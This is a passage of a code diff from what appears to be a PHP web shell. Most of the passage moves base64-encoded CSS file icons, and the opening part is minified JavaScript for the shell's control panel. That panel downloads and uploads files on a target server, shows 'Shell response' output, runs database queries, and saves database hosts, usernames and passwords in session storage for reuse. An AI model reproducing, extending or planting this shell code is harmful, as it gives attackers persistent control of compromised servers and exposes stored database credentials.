id=\'dlf\' class=\'hide\' src=\'"+targeturl+"?dsr="+getData("me=filemanager&md=tools&ac=dl&fl="+euc(dpath(o,true)),"e")+"\'></iframe>")}function up(){ct="<form name=\'up\' enctype=\'multipart/form-data\' method=\'post\' action=\' + targeturl + \'>"+"<input type=\'hidden\' value=\'"+decodeURIComponent(getData("me=filemanager&ac=up&dir="+euc(d.getElementById("base").value),"e"))+"\' name=\'dsr\'>"+"<table class=\'boxtbl\'>"+"<tr><td class=\'colFit\'>File</td><td><input name=\'upf\' value=\'\' type=\'file\' /></td></tr>"+"<tr><td colspan=\'2\'><span class=\'button\' onclick=\'document.up.submit()\'>Go!</span></td></tr>"+"</table>"+"</form>";show_box("Upload",ct)}function uiupdate(t){ajax(serialize(d.forms[t]),function(r){if(!d.getElementById("uires"))prepend("content","<div id=\'uires\' class=\'uires\'></div>");append("uires","Shell response: "+r+"<br>\n");d.getElementById("uires").scrollIntoView()})}function CheckAll(form){for(i=0;i<form.elements.length;i++){e=form.elements[i];if(e.name!="chkall")e.checked=form.chkall.checked}}function toggle(b){if(d.getElementById(b)){if(d.getElementById(b).style.display=="block")d.getElementById(b).style.display="none";else d.getElementById(b).style.display="block"}}function change(l,b){d.getElementById(l).style.display="none";d.getElementById(b).style.display="block";if(d.getElementById("goui"))d.getElementById("goui").focus()}function hilite(e){c=e.parentElement.parentElement;if(e.checked)c.className="mark";else c.className="";a=d.getElementsByName("cbox");b=d.getElementById("total_selected");c=0;for(i=0;i<a.length;i++)if(a[i].checked)c++;if(c==0)b.innerHTML="";else b.innerHTML=" ( selected : "+c+" items )"}function dbexec(c){empty("dbRes");append("dbRes","<div class=\'loading\'></div>");ajax(serialize(d.forms[0])+\'&code=\'+c,function(r){empty("dbRes");append("dbRes",r);uiUpdateControls()})}function dbengine(t){d.getElementById("su").className="hide";d.getElementById("sp").className="hide";d.getElementById("so").className="hide";if((t.value==="odbc")||(t.value==="pdo")){d.getElementById("sh").innerHTML="DSN/Connection String";d.getElementById("su").className="";d.getElementById("sp").className=""}else if((t.value==="sqlite")||(t.value==="sqlite3")){d.getElementById("sh").innerHTML="DB File"}else{d.getElementById("sh").innerHTML="Host";d.getElementById("su").className="";d.getElementById("sp").className="";d.getElementById("so").className=""}}function dbhistory(a){if(a=="s"){o={history:[]};if(sessionStorage.getItem("conlog")!=null)o=JSON.parse(sessionStorage.getItem("conlog"));o.history.push({"type":d.getElementById("type").value,"host":d.getElementById("host").value,"port":d.getElementById("port").value,"user":d.getElementById("user").value,"pass":d.getElementById("pass").value});sessionStorage.setItem("conlog",JSON.stringify(o))}else if(sessionStorage.getItem("conlog")!=null){s="";o=JSON.parse(sessionStorage.getItem("conlog"));for(i=0;i<o.history.length;i++){u="me=sql&host="+o.history[i].host+"&port="+o.history[i].port+"&user="+o.history[i].user+"&pass="+o.history[i].pass+"&type="+o.history[i].type;s+="["+o.history[i].type.toUpperCase()+"] "+o.history[i].user+"@"+o.history[i].host+"<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;"+u+"&quot;)\'>Go!</a></span><br>"}if(s!="")prepend("content","<div id=\'uires\' class=\'uires\'>"+s+"</div>")}}
 	  		' . $defAction . '
 	  </script>
 	  <style type="text/css">
@@ -2346,7 +2323,39 @@ if (isset($p['me'])) {
 			display:block;
 			float:left;
 			margin-right:3px;
-		}	  
+		}
+	
+		.asp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAOBAMAAADUAYG5AAAAHlBMVEX29/fX09Pk4+PKlJPAODWUBgXftbTAW1iuDw3ReXeTvAtzAAAAV0lEQVR4AWPAA1JcwMCJYUanR6dJp2UbQ4WDxbRiR8dihlLLDLd0p0nODBVqmiVFhSXBDOWpZYXJbqHBDFNDQ0NbQ0PDGISNwcCIQQkKGBQFIYABSosBAKxPGDO5nrSTAAAAAElFTkSuQmCC") no-repeat;}
+		.avi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH////AwMCAgIAAAAD/AACxZc2lAAAAAXRSTlMAQObYZgAAAFRJREFUeF5FzMERwCAIRNFtgRICFGAiuUfd/msKyej4T++wAKBmBdkpIrZwlAlyQhxloVoeSXVE124jHA+p1tyBS9UYiVv7aEwEySa+/2zkOvvAvxdlbRDkNPgrwgAAAABJRU5ErkJggg==") no-repeat;}
+		.cgi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH/2zL06Jebagh4d3WxiDBNS0rcsBxqIGFJAAAAAXRSTlMAQObYZgAAAGtJREFUeAFjAAJmBigwNoAyDKEM5sBgFAazsXFhsbExA4ORkpKgkJKSCYO5kKCgkGCpCQNLuKCgkmiaAwODS6GgUlgKUDWLopBimANIm6C4YhmEERYkGgBkGJWmuKqHABmmQB2hIAaLCxgDALfSD/3zyHbnAAAAAElFTkSuQmCC") no-repeat;}
+		.cmd{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH///+AgIAAAADAwMAAAICAgAD//wBP2DYPAAAAAXRSTlMAQObYZgAAAENJREFUeAFjgAMlKGBQcQEDZQaVUDCAMISFhYEMiBIgQxAMwIw0QyjDPBnCECtSToSImBRDpYRBahC6lGDmGEMB3BUAQQYRh0ILDgoAAAAASUVORK5CYII=") no-repeat;}
+		.copy{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHr8ffC4f6v1PF7nrqOwutWbYw/SVvnK+2gAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjgANm4xAXBzBDUFAwDMwQUgaJgRjGEDFWoWAhJcXQBAYWMEMQxAgVUlI2BDFChJSMDQvADGUUBpugiZCxaSBQJC0FwmAAigkKCgMZQLH08vIEuCsAm2MSZ1K+LZgAAAAASUVORK5CYII=") no-repeat;}
+		.cpp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH///8AAIDAwMCAgIAAAACRQaxqAAAAAXRSTlMAQObYZgAAAEVJREFUeAFjYHEBAgcGBgYWQSAwgTEMHKCM0FAoQ9AUxFBSFFQEMYQUlYSUoAyYCFANXAShBqELYQ6CYQwCQAZrKBgwAACCmg2Bo41i4wAAAABJRU5ErkJggg==") no-repeat;}
+		.del{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEWeAgKfHx7NlZXCf36mSUm3YGDQAADTnp94I1VJAAAABnRSTlP+8AJGi/pSC0zeAAAAcUlEQVR4Xi2J0QnCQBBERyJ+qwkW8PYK8A4swANiAXLk10DYCrz+XYIPGN7MiFTAKuL1hscXpaUXW3rVs7UxtzYpX3YmmXaquCs4IuwcUv9yKIh8cvcB2c2DT1GOjG3Q7L5FWZXca9yjmDfIKyJVsCs/V0YYHsrbmCoAAAAASUVORK5CYII=") no-repeat;}
+		.dir{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXH//5zOzmOcnAAAAAD//87/zpz39/cJIMBEAAAAAXRSTlMAQObYZgAAAEtJREFUeAFjIAyYjY0doEzzUEETqKCSkpKysbEBiBkKAoEqIGagIBCIwZmJiXCmGFw0ESEqBhMFCaaBmWFiQABhKoEBiMngAgEMDABNLxCJtl4npgAAAABJRU5ErkJggg==") no-repeat;}
+		.doc{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXEAAP/////AwMAAAACAgIDs+4PxAAAAAXRSTlMAQObYZgAAAFxJREFUeF4ljcENgDAMA/1hgdIFEjpB2wFI1AEQgv1XwQn3Op1kGdhecoGi5AFqoPcJZxBd6y+jT5ibmFJKqW12ipuZhJQ69zayiIsqC+dZLGDJi4MlhYSMIGQlH9rmFP/olcG8AAAAAElFTkSuQmCC") no-repeat;}
+		.download{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHy+PxRf7vD3Pdyotucv+mOxGHP8pZRJPvxAAAAAXRSTlMAQObYZgAAAGlJREFUeAE1yTESQUEQhOEuxQH68UiZ3T0AQ85WuwAcQCIXub7ZxR991Q1Mb4oAzBgdjsCZrX3DllyMQJp7YNfhPqyBjUumjjSSl4Yy/EGydkiqmJyuP2R9r0yW5fMRy93T6v0KmFmW2Qe9LBLI5TPE4QAAAABJRU5ErkJggg==") no-repeat;}
+		.edit{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHM4vlAesHy9fTu0HO/jEje0bNiuvgtn6IlAAAAAXRSTlMAQObYZgAAAGVJREFUeAElzcENgCAMQNHGDRoTuBI2MBIdQOCsEXQA6wQeWN+2/NNLm7QAXgKAYeasY0yIuJS9g55XYXLuoJB0ZbaYnIBCvAQmxzQKiOKhOGtFwVrS3T4BD1BgGyfgg/yWv3oNfvxKFuu6ZIarAAAAAElFTkSuQmCC") no-repeat;}
+		.exe{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAOBAMAAAA/Njq6AAAAElBMVEVMaXGEhITGxsb///8AAAAAAL3QMzG6AAAAAXRSTlMAQObYZgAAADdJREFUeAFjYBSEAAEGBkYlMFB0ADJVQ0EgEMoMdnZ2BDEVIWpBTGVjEDCkDlMQbi6LCwQ4MAAAGdsU7SMxZ3cAAAAASUVORK5CYII=") no-repeat;}
+		.htaccess{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH/AAD/AP8AAIAAAACAAID//wAh7q3vAAAAAXRSTlMAQObYZgAAAEhJREFUeAFjSAtggIC0QCiDNVQAyhJRhDKEjAQhDEZnRQEIQwUmJGQMFRJUdhKEyCGEVIwUIUJKzkYwIWMGqKoQByhLwIUBBgAzAQdHwl34ZQAAAABJRU5ErkJggg==") no-repeat;}
+		.html{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXFIXpDA1vuEuNwumeJzc3P2+/9fl8ofnhI8AAAAAXRSTlMAQObYZgAAAHtJREFUeF41yr0Kg0AQhdGB/FhfY0idTbB3N6xtBgZsbfIEytZBwXn9uLPkqw6XS0Rh70tWTCnpnw9fv4296oxbVrWGYUr3cac+RbbCrYsyGKtJVLjNPL8YgPHQsXets4NI3bDxODfSX8oaGfBGWpfgXSEBVwDG0yc30g+Tqhs347zYeAAAAABJRU5ErkJggg==") no-repeat;}
+		.info{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHW4/Gcuty90upmkL57o87x9fo/cKp6YdxCAAAAAXRSTlMAQObYZgAAAGxJREFUeAFjQAbGxhDaUFBQCEQzCyopCSqABEQVhYJBQoKhaWmhQFVMQqHCZiaKAQxMoiHOaSqBDkCGi5uIi6MDA6uQCxAARRiMQ9xSXIyAuhxNnFSczIEMFuMQV+MCkNFFgoLqEMvKy5GdAAAtjxBWRk6H0AAAAABJRU5ErkJggg==") no-repeat;}
+		.ini{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMAAAACAgICAgAD//wBJC4D8AAAAAXRSTlMAQObYZgAAAERJREFUeAFjYGAWBgIGIDB0BAIDBgYWYTAAMgRBQBmFYWxojC5iDBMRCoKKqKYaQkTCzALRRISDUbUrgQCQwWAMAgYMAE/+DM0VyVW8AAAAAElFTkSuQmCC") no-repeat;}
+		.jpg{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXETCgDAwMCAgID///+AgAD/AAAA/wCvPqjdAAAAAXRSTlMAQObYZgAAAF9JREFUeAE1yMENAiAMRuGOwG+I3Em4G2QBavVenICLK7C+bY3v9OXR3SNriAjf/njQDkxcDc/WlD+JBgP62mSnHLVhp5w3kh/UfomTAY6TRQO81g8TQEAsR6+eAVGiL7noFeTJktBqAAAAAElFTkSuQmCC") no-repeat;}
+		.js{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEX////AwMCAgIAAAAD//wCAgAA6+FsGAAAAWklEQVR4XlWLyw3AIAxDA2oHQFkgfAZAZAGqTsAh+69SYk716Vl+pnJSSWizEG+IczJAbI2+IdLkDLhN1ScocJqt/n+VagFyGP1xkLddmGKq6ciq6vecEPaOfCLwDtcqFA/EAAAAAElFTkSuQmCC") no-repeat;}
+		.lnk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXFmzzYmnRNLuigJZAUAAgCI71YEPgJXrsCKAAAAAXRSTlMAQObYZgAAAGRJREFUeF4lzLEKgDAMRdEMFedQ7W6LOItgZ8HuRQjuKv5B/9+8mulwE0K0YxIReR9mThlYuBMAQbBa2CKQBh4rmPVGMVh2V0Xc3hsI5fgxyekeoEi79oBk4wrQkIl4qDQ1oCF8s2QTzGgZmRgAAAAASUVORK5CYII=") no-repeat;}
+		.log{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHAwMAAAAD///+AgIAAALWAgAD//wD7+LBgAAAAAXRSTlMAQObYZgAAAFxJREFUeF41jMsJgEAMRIcFC/DiOYxsAf5yly1BbECELcD+wWSN7/SYgQeIAyCtxmxSRkc6lMWY5AzJB/beyVssjEuZv6tebIs+tzSpSvg1kAJfaEH8ZUTQJNEBXtl7FF5T+NYtAAAAAElFTkSuQmCC") no-repeat;}
+		.mp3{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMCAgIAAAACAgAD//wAFULzlAAAAAXRSTlMAQObYZgAAAGdJREFUeAE1ykEKAjEUA9AgzgFC5wKjg2tj1X2hPcAH7Qm8/xlMi2aTR/4HkJ2rGyJ5/mMb0yOTtQJLtCB34J2KkrHEZ5OMuKxuoz/Xoqwdx+bTfL73Ig0c2iuS4amSE+IPt5MzUGe+vOoRl1gyM5QAAAAASUVORK5CYII=") no-repeat;}
+		.php{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEXt7u20pbN1PXqqna3h3+CiY5iji5/Cn72aaulJAAAAB3RSTlP+C/jy9vd9m8nrNgAAAGNJREFUeF41zMEJwCAMheF36AK5dAChOIDiuZRMIATP0tIBKpL1m4r9L/kg8EAXM1ciEKz0I9SJliYWnoCdVUc3RLpIEUH2sRU9NjivUfVxhhx8d4YZ1jCqIN6/RTKMDGewEr0JfRdojfORagAAAABJRU5ErkJggg==") no-repeat;}
+		.pl{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVLS/WWlrdzc7O7u/L39/0vLzB1dXfIyLy8AAAAbUlEQVR4XkXLQQ4CIQyF4RfxAjWVteIFUAxryfQEmrKfCHP/I0jJJP6rL3l5oD2wSH6KFHC694+Bat+qwa+lKtvkt6xNHmDRs7ZSccHsgFuMA24ARwdnWF7JJQMQsWNO/xcvun69vkEUAp3C9QcQsBJpjnPQBwAAAABJRU5ErkJggg==") no-repeat;}
+		.py{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASBAMAAACgFUNZAAAAFVBMVEXU1dBJSUmIiIhMaXH39/ZJf6z12mal68qMAAAABHRSTlPwbJkA1LtzKgAAAGFJREFUeF49yrsNhEAMRdGHZBMjoAFowQ04sIg38cYTTf8l8MwIbnT8wXo+HdhFgjl2BwbCM6UgqvkruOaAJtGIZP/+AYW59wJHVs8vnJcGIq7CRDjhGxHOhRXIzbCATWY3y8IfVW0lgwUAAAAASUVORK5CYII=") no-repeat;}
+		.rename{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAHlBMVEXP2unl6/NogqS8x9Y/R1L5+/2GlKecqLgrMTpabYUCMXjvAAAACXRSTlP99gP+rv7d/ScbTgzOAAAAdElEQVR4AWNQUmY2NmZrUgIyBBgYRDOgDNYQKINBpAnKCAExBIEAxGiHSiUXGwOBeQlDomBooGhoYAhD4vTk9OLUMBGGxInlCQHTw1gYEmeWTisvL2MBShVODE7MZGFImFg8LT1RTASoS1CAEWgiQ4sLBAAAQBEfQdjw2gUAAAAASUVORK5CYII=") no-repeat;}
+		.swf{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAGFBMVEVMaXEAAAD/////RBylAAD8z5/njpP/tgDJs8ZAAAAAAXRSTlMAQObYZgAAAGpJREFUeAFjwAEYBcEAzFQCAUUoM1zJSCkAwlQPMgo2ADGBrFJTU4gC1fJ04wCoWrUiVWNjCDPFSdkYIqriFuIC1aYSlJLsZAxV66LmxgxiKgqpuCmZQNQKhiQpqYCZimIgR6A4B+FIHAAAPKISiDRgUyIAAAAASUVORK5CYII=") no-repeat;}
+		.tar{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXE7QAUXAAAAUW/l6ey8lKGJBVFVz9lgkT8gAAAAAXRSTlMAQObYZgAAAFJJREFUeAFjEIQAAYbQ0MQ0IEhicHFJcQkNDQ0CMlJhIoJKIMCgBAEKQMXGYACUMnEvLy8vBjJMYSKCYAayYogdQCkRkOJCIEMUpMQQpBgM4IoBaBkbvmcdFLkAAAAASUVORK5CYII=") no-repeat;}
+		.txt{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAD1BMVEVMaXH///8AAADHx8eFhYXIFtsVAAAAAXRSTlMAQObYZgAAADVJREFUeAFjYGACAwYQUHQEAQUgi0UIAkBMQTAwQmcqKSopYRFVolQUwTQGAxCTQQkMgC4DAOb7DCz7id5MAAAAAElFTkSuQmCC") no-repeat;}
+		.unk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXGFptrR5PxfaHnx9/60zPMlTqR1iLk29K4nAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjYBAEAgEGIBBxcXERNIAxxMEM1yClcAMgwzUtLUkVxHBLD08DM8KSlCAMJyVFMENISaksFcwACgSFAhlFSmqJqhCGqmgoTASVUQiyvhzIYDYGAQMAJZwXv2puTlMAAAAASUVORK5CYII=") no-repeat;}
+		.xml{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH6+vqGhoYAAAAsap6Kyu8AAJYzmQAtPsCtAAAAAXRSTlMAQObYZgAAAE9JREFUeAFjUAIDBgYGRUEgEFWAMYSgDGFjAwZFUUEXR1FBICNMRDRMLNCAQTVRJLRMMBUsEp4GFAGpSUsEqxEEARBDxAUI8IogGMYQYAAA5l8SSFIGd4wAAAAASUVORK5CYII=") no-repeat;}
+	  
 
 		div.paginator {
 			text-align:center;
@@ -2381,37 +2390,7 @@ if (isset($p['me'])) {
 			margin: 2px;
 			border: 1px solid #eee; 
 			color: #ddd; 
-		}		.asp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAOBAMAAADUAYG5AAAAHlBMVEX29/fX09Pk4+PKlJPAODWUBgXftbTAW1iuDw3ReXeTvAtzAAAAV0lEQVR4AWPAA1JcwMCJYUanR6dJp2UbQ4WDxbRiR8dihlLLDLd0p0nODBVqmiVFhSXBDOWpZYXJbqHBDFNDQ0NbQ0PDGISNwcCIQQkKGBQFIYABSosBAKxPGDO5nrSTAAAAAElFTkSuQmCC") no-repeat;}
-		.avi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH////AwMCAgIAAAAD/AACxZc2lAAAAAXRSTlMAQObYZgAAAFRJREFUeF5FzMERwCAIRNFtgRICFGAiuUfd/msKyej4T++wAKBmBdkpIrZwlAlyQhxloVoeSXVE124jHA+p1tyBS9UYiVv7aEwEySa+/2zkOvvAvxdlbRDkNPgrwgAAAABJRU5ErkJggg==") no-repeat;}
-		.cgi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH/2zL06Jebagh4d3WxiDBNS0rcsBxqIGFJAAAAAXRSTlMAQObYZgAAAGtJREFUeAFjAAJmBigwNoAyDKEM5sBgFAazsXFhsbExA4ORkpKgkJKSCYO5kKCgkGCpCQNLuKCgkmiaAwODS6GgUlgKUDWLopBimANIm6C4YhmEERYkGgBkGJWmuKqHABmmQB2hIAaLCxgDALfSD/3zyHbnAAAAAElFTkSuQmCC") no-repeat;}
-		.cmd{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH///+AgIAAAADAwMAAAICAgAD//wBP2DYPAAAAAXRSTlMAQObYZgAAAENJREFUeAFjgAMlKGBQcQEDZQaVUDCAMISFhYEMiBIgQxAMwIw0QyjDPBnCECtSToSImBRDpYRBahC6lGDmGEMB3BUAQQYRh0ILDgoAAAAASUVORK5CYII=") no-repeat;}
-		.copy{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHr8ffC4f6v1PF7nrqOwutWbYw/SVvnK+2gAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjgANm4xAXBzBDUFAwDMwQUgaJgRjGEDFWoWAhJcXQBAYWMEMQxAgVUlI2BDFChJSMDQvADGUUBpugiZCxaSBQJC0FwmAAigkKCgMZQLH08vIEuCsAm2MSZ1K+LZgAAAAASUVORK5CYII=") no-repeat;}
-		.cpp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH///8AAIDAwMCAgIAAAACRQaxqAAAAAXRSTlMAQObYZgAAAEVJREFUeAFjYHEBAgcGBgYWQSAwgTEMHKCM0FAoQ9AUxFBSFFQEMYQUlYSUoAyYCFANXAShBqELYQ6CYQwCQAZrKBgwAACCmg2Bo41i4wAAAABJRU5ErkJggg==") no-repeat;}
-		.del{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEWeAgKfHx7NlZXCf36mSUm3YGDQAADTnp94I1VJAAAABnRSTlP+8AJGi/pSC0zeAAAAcUlEQVR4Xi2J0QnCQBBERyJ+qwkW8PYK8A4swANiAXLk10DYCrz+XYIPGN7MiFTAKuL1hscXpaUXW3rVs7UxtzYpX3YmmXaquCs4IuwcUv9yKIh8cvcB2c2DT1GOjG3Q7L5FWZXca9yjmDfIKyJVsCs/V0YYHsrbmCoAAAAASUVORK5CYII=") no-repeat;}
-		.dir{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXH//5zOzmOcnAAAAAD//87/zpz39/cJIMBEAAAAAXRSTlMAQObYZgAAAEtJREFUeAFjIAyYjY0doEzzUEETqKCSkpKysbEBiBkKAoEqIGagIBCIwZmJiXCmGFw0ESEqBhMFCaaBmWFiQABhKoEBiMngAgEMDABNLxCJtl4npgAAAABJRU5ErkJggg==") no-repeat;}
-		.doc{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXEAAP/////AwMAAAACAgIDs+4PxAAAAAXRSTlMAQObYZgAAAFxJREFUeF4ljcENgDAMA/1hgdIFEjpB2wFI1AEQgv1XwQn3Op1kGdhecoGi5AFqoPcJZxBd6y+jT5ibmFJKqW12ipuZhJQ69zayiIsqC+dZLGDJi4MlhYSMIGQlH9rmFP/olcG8AAAAAElFTkSuQmCC") no-repeat;}
-		.download{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHy+PxRf7vD3Pdyotucv+mOxGHP8pZRJPvxAAAAAXRSTlMAQObYZgAAAGlJREFUeAE1yTESQUEQhOEuxQH68UiZ3T0AQ85WuwAcQCIXub7ZxR991Q1Mb4oAzBgdjsCZrX3DllyMQJp7YNfhPqyBjUumjjSSl4Yy/EGydkiqmJyuP2R9r0yW5fMRy93T6v0KmFmW2Qe9LBLI5TPE4QAAAABJRU5ErkJggg==") no-repeat;}
-		.edit{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHM4vlAesHy9fTu0HO/jEje0bNiuvgtn6IlAAAAAXRSTlMAQObYZgAAAGVJREFUeAElzcENgCAMQNHGDRoTuBI2MBIdQOCsEXQA6wQeWN+2/NNLm7QAXgKAYeasY0yIuJS9g55XYXLuoJB0ZbaYnIBCvAQmxzQKiOKhOGtFwVrS3T4BD1BgGyfgg/yWv3oNfvxKFuu6ZIarAAAAAElFTkSuQmCC") no-repeat;}
-		.exe{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAOBAMAAAA/Njq6AAAAElBMVEVMaXGEhITGxsb///8AAAAAAL3QMzG6AAAAAXRSTlMAQObYZgAAADdJREFUeAFjYBSEAAEGBkYlMFB0ADJVQ0EgEMoMdnZ2BDEVIWpBTGVjEDCkDlMQbi6LCwQ4MAAAGdsU7SMxZ3cAAAAASUVORK5CYII=") no-repeat;}
-		.htaccess{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH/AAD/AP8AAIAAAACAAID//wAh7q3vAAAAAXRSTlMAQObYZgAAAEhJREFUeAFjSAtggIC0QCiDNVQAyhJRhDKEjAQhDEZnRQEIQwUmJGQMFRJUdhKEyCGEVIwUIUJKzkYwIWMGqKoQByhLwIUBBgAzAQdHwl34ZQAAAABJRU5ErkJggg==") no-repeat;}
-		.html{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXFIXpDA1vuEuNwumeJzc3P2+/9fl8ofnhI8AAAAAXRSTlMAQObYZgAAAHtJREFUeF41yr0Kg0AQhdGB/FhfY0idTbB3N6xtBgZsbfIEytZBwXn9uLPkqw6XS0Rh70tWTCnpnw9fv4296oxbVrWGYUr3cac+RbbCrYsyGKtJVLjNPL8YgPHQsXets4NI3bDxODfSX8oaGfBGWpfgXSEBVwDG0yc30g+Tqhs347zYeAAAAABJRU5ErkJggg==") no-repeat;}
-		.info{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHW4/Gcuty90upmkL57o87x9fo/cKp6YdxCAAAAAXRSTlMAQObYZgAAAGxJREFUeAFjQAbGxhDaUFBQCEQzCyopCSqABEQVhYJBQoKhaWmhQFVMQqHCZiaKAQxMoiHOaSqBDkCGi5uIi6MDA6uQCxAARRiMQ9xSXIyAuhxNnFSczIEMFuMQV+MCkNFFgoLqEMvKy5GdAAAtjxBWRk6H0AAAAABJRU5ErkJggg==") no-repeat;}
-		.ini{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMAAAACAgICAgAD//wBJC4D8AAAAAXRSTlMAQObYZgAAAERJREFUeAFjYGAWBgIGIDB0BAIDBgYWYTAAMgRBQBmFYWxojC5iDBMRCoKKqKYaQkTCzALRRISDUbUrgQCQwWAMAgYMAE/+DM0VyVW8AAAAAElFTkSuQmCC") no-repeat;}
-		.jpg{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXETCgDAwMCAgID///+AgAD/AAAA/wCvPqjdAAAAAXRSTlMAQObYZgAAAF9JREFUeAE1yMENAiAMRuGOwG+I3Em4G2QBavVenICLK7C+bY3v9OXR3SNriAjf/njQDkxcDc/WlD+JBgP62mSnHLVhp5w3kh/UfomTAY6TRQO81g8TQEAsR6+eAVGiL7noFeTJktBqAAAAAElFTkSuQmCC") no-repeat;}
-		.js{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEX////AwMCAgIAAAAD//wCAgAA6+FsGAAAAWklEQVR4XlWLyw3AIAxDA2oHQFkgfAZAZAGqTsAh+69SYk716Vl+pnJSSWizEG+IczJAbI2+IdLkDLhN1ScocJqt/n+VagFyGP1xkLddmGKq6ciq6vecEPaOfCLwDtcqFA/EAAAAAElFTkSuQmCC") no-repeat;}
